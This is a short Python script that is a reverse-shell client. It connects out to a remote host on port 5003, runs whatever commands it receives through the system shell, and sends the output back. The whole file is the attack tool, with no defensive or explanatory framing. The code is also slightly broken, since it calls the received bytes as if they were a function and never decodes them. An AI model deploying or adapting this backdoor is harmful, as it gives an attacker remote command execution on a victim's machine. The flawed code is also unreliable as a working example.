import socket
import subprocess

SERVER_HOST = ""
SERVER_PORT = 5003
BUFFER_SIZE = 1024


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE)
    if command() == "exit":

        break

    else:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send( output.stdout.read() )
        s.send( output.stderr.read() )
            
s.close()
